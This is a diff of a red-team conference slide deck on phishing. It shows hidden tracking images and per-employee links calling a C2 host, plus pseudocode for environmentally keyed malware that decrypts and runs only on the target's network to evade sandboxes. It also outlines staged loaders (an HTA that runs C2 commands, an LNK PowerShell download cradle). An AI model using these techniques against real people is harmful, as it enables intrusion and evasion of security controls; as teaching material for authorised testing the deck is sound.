@@ -36,6 +36,10 @@
 			font-weight: bold;
 			color: #f99339;
 		}
+		.fade {
+			font-weight: bold;
+			color: #515151;
+		}
       .remark-slide-content h1 { font-size: 200px; }
       .remark-slide-content h2 { font-size: 80px; margin: 0 0 0 0;}
       .remark-slide-content h3 { font-size: 50px; margin: 0 0 0 0;}
@@ -77,6 +81,13 @@ background-repeat: no-repeat;
 background-size: contain;
 background-size: 100%;
 }
+#slide-subway {
+background: linear-gradient( rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.6) ), url(subway.jpg);
+background-position: center;
+background-repeat: no-repeat;
+background-size: contain;
+background-size: 100%;
+}
 ////////////////////////////////
 
 
@@ -100,6 +111,12 @@ class: center, middle
 ## .stroke[Burn Better]
 
 https://dumpco.re/slides/phishing
+---
+name: subway
+class: middle
+## intro
+### - @magnusstubman
+### - pentester / red teamer @ improsec
 ---
 class: middle
 ## .color[Goals]
@@ -260,10 +277,9 @@ class: middle, center
 ---
 class: middle
 ### - email scanning products?
-### - AV/EDR?
-### - suspicious user reporting it? 
 ### - sandbox?
-### - sysmon on steroids?
+### - suspicious user reporting it? 
+### - AV/EDR?
 ---
 class: middle, center
 ## if you don't know
@@ -284,18 +300,151 @@ class: middle
 
 legitimate email w. a question + tracking image:
 
-gives you external IP address and AD domain name, that can be used as .color[environmental keys] to defeat (most) sandboxes/email scanning products
+gives external IP address and AD domain name, that can be used as .color[environmental keys] to defeat (most) sandboxes/email scanning products
+
+&lt; img src="http://c2/.color[heartbeat1.png]" style="height:0px; width:0px;"&gt;
+
+access.log:  
+.grey[81.214.8.247] - - [22/mar/2021:04:49:52 +0100] "GET .color[/heartbeat1.png] http/1.1" 302 525 "-" "mozilla..
+---
+class: middle
+## .color[Environmental keying]
+make your paylaod such that it:
+### 1. gets external IP-address/domain name
+### 2. use it as an .grey[encryption key to decrypt malware]
+---
+## Pseudocode#1:
+.color[encryptionKey] = getIPaddress()
+
+encryptedMalware = "\x3a\x94\x90\xde\xad\0xbe. . ."
+
+.grey[malware] = decrypt(encryptedMalware, .color[encryptionKey])
+
+execute(.grey[malware])
+---
+## Pseudocode#2:
+.color[encryptionKey] = getDomainName()
+
+encryptedMalware = "\x3a\x94\x90\xde\xad\0xbe. . ."
+
+.grey[malware] = decrypt(encryptedMalware, .color[encryptionKey])
+
+execute(.grey[malware])
 ---
 class: middle
 ## ..which leaves us:
 ### - suspicious user reporting it? 
 ### - AV/EDR?
-### - sysmon on steroids?
+---
+background-image: url(heartbeatr2.png)
+background-size: cover
+class: middle, center
+## heartbeat
+---
+class: middle
+### .color[Did the user]..
+### .grey[1]. read the e-mail?
+### .grey[2]. click the link?
+### .grey[3]. open the document?
+### .grey[4]. enable macros?
+---
+.grey[1]. .color[Did the user read the e-mail]?
+
+add html image tag to the e-mail:  
+
+&lt; img src="http://c2/heartbeat1.png" style="height:0px; width:0px;"&gt;
+---
+.grey[1]. .color[Did the user read the e-mail]?
+
+add html image tag to the e-mail:  
+
+&lt; img src="http://c2/heartbeat1.png" style="height:0px; width:0px;"&gt;
+
+access.log:  
+81.214.8.247 - - [22/mar/2021:04:49:52 +0100] "GET .color[/heartbeat1.png] http/1.1" 302 525 "-" "mozilla/5.0 (x11; ubuntu; linux x86_64; rv:62.0) gecko/20100101 firefox/62.0"
+---
+.grey[2]. .color[Did the user click the link]?
+
+use unique links for each phishing e-mail:  
+
+http://payloadhost/totally-legit/legit-document.docx?employeeId=.grey[9t3y49tgy3]
+---
+.grey[2]. .color[Did the user click the link]?
+
+use unique links for each phishing e-mail:  
+
+http://payloadhost/totally-legit/legit-document.docx?employeeId=.grey[9t3y49tgy3]
+
+access.log:  
+81.214.8.247 - - [22/mar/2021:04:49:52 +0100] "GET .color[/totally-legit/legit-document.docx?employeeId=].grey[9t3y49tgy3] http/1.1" 302 525 "-" "mozilla/5.0 (x11; ubuntu; linux x86_64; rv:62.0) gecko/20100101 firefox/62.0"
+---
+.grey[3]. .color[Did the user open the document]?
+
+Add 'external image' that loads when document opens:
+
+<img src="doc-external-image1.png" style="width: 65%;" >  
+.fade[(1/3)]
+---
+.grey[3]. .color[Did the user open the document]?
+
+Add 'external image' that loads when document opens:
+
+<img src="doc-external-image22.png" style="width: 65%;" >  
+.fade[(2/3)]
+---
+.grey[3]. .color[Did the user open the document]?
+
+Add 'external image' that loads when document opens:
+
+<img src="doc-external-image3.png" style="width: 90%;" >  
+.fade[(3/3)]
+
+access.log:  
+81.214.8.247 - - [22/mar/2021:04:49:52 +0100] "GET .color[/img/windbg-hooked-process.png] http/1.1" 302 525 "-" "mozilla/5.0 (x11; ubuntu; linux x86_64; rv:62.0) gecko/20100101 firefox/62.0"
+---
+.grey[4]. .color[Did the user enable macros]?
+
+Add macro that loads 'external image':
+
+<img src="macro-trigger1.png" style="width: 60%;" >  
+.fade[(1/2)]
+---
+.grey[4]. .color[Did the user enable macros]?
+
+Add macro that loads 'external image':
+
+<img src="macro-trigger2.png" style="width: 90%;" >  
+.fade[(2/2)]
+
+access.log:  
+81.214.8.247 - - [22/mar/2021:04:49:52 +0100] "GET .color[/img/macro-triggered.png] http/1.1" 302 525 "-" "mozilla/5.0 (x11; ubuntu; linux x86_64; rv:62.0) gecko/20100101 firefox/62.0"
+---
+class: middle
+### - ~~email scanning products?~~
+### - ~~sandbox?~~
+### - ~~suspicious user reporting it?~~
+### - AV/EDR?
+---
+class: middle
+### - ~~email scanning products?~~
+### - ~~sandbox?~~
+### - ~~suspicious user reporting it?~~
+### - AV/EDR? .color[<- how do we reduce likelihood]?
+---
+class: middle
+## .color[Test] AV/EDR in  
+##.color[offline lab environment]
+
+.grey[problems:]  
+### - which AV/EDR?
+### - Trial version?
+### - Pirate it?
+### - Buy it?
 ---
 name: lightbulb
 class: middle, center
 
-## .grey[.stroke[Flamable Phishing]]
+## .grey[.stroke[Flammable Phishing]]
 ## .stroke[Strategy]:
 ### .color[.stroke[make it OK]] .stroke[that your payload gets] .stroke[burned]
 ### .stroke[(or at least] .color[.stroke[less painful]])
@@ -324,7 +473,7 @@ class: middle
 - stage.color[0]: .grey[code execution] aka "loader" - allow us to execute *something*
 	- doc/lnk/hta/js/+++
 - stage.color[1]: .grey[basic access] and (maybe) persistence
-	- basic malware, few capabilities (SilentBreakSecurity's Throwback)
+	- basic malware, few capabilities (e.g. SilentBreakSecurity's Throwback)
 - stage.color[2]: .grey[fully operational malware]
 	- all required capabilities we need to achieve goals (Cobalt Strike, Slingshot, etc)
 ---
@@ -336,25 +485,25 @@ class: middle
 - stage.color[2]: Cobalt Strike Beacon running
 ---
 class: middle
-### .grey[Flamable Phishing] strategy example
+### .grey[Flammable Phishing] strategy example
 - stage.color[0] & stage.color[1] in one file: HTA file that:
-  1. Enummerate installed software, and send info to C2
+  1. Enumerate installed software, and send info to C2
   2. Execute anything that C2 sends back, check continuously and wait
 
 #### Example: https://gist.github.com/magnusstubman/d12c7cc6b4a12a5bd1843c021c03a252
 ---
 <iframe width="100%" height="600px" src="https://www.youtube-nocookie.com/embed/g_rG1uPveuw" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 ---
-<a href="flamable-recon-phish.mov">flamable-recon-phish.mov</a>
+<a href="flammable-recon-phish.mov">flammable-recon-phish.mov</a>
 ---
 class: middle
-### .grey[Flamable Phishing] strategy example#2
+### .grey[Flammable Phishing] strategy example#2
 - stage.color[0]: LNK file with powershell download cradle
-- stage.color[1]: download and execute cheap/throwaway/flamable payload
+- stage.color[1]: download and execute cheap/throwaway/flammable payload
 - stage.color[2]: load purpose-built stage2 malware based on recon from stage1 that has been tested/bypassed in offline lab environment
 ---
 class: middle
-### SilentBreakSecurity's phishing strategy example
+### .grey[Flammable Phishing] strategy example#3
 - stage.color[0]: Word macro that use DotNetToJs to spawn stage1
 - stage.color[1]: Throwback, which can load arbitrary DLLs via sRDI to spawn stage2
 - stage.color[2]: Slingshot, Cobalt Strike, etc 
@@ -362,7 +511,13 @@ class: middle
 ---
 class: middle
 ## Summary
+- If you don't know what went wrong, you can't fix it
+- your phishing will (usually) fail/burn to begin with 
 - Make "discount" malware - doesnt hurt as much when it burns
+---
+class: center, middle
+# ty
+@magnusstubman
 ---
 class: middle, center
 ## Misc
@@ -381,7 +536,7 @@ class: midde
 3. execute %TEMP%\notepad.exe
 ---
 class: center, middle
-# ty
+# ty again
 @magnusstubman
     </textarea>
     <script src="remark2.js"></script>
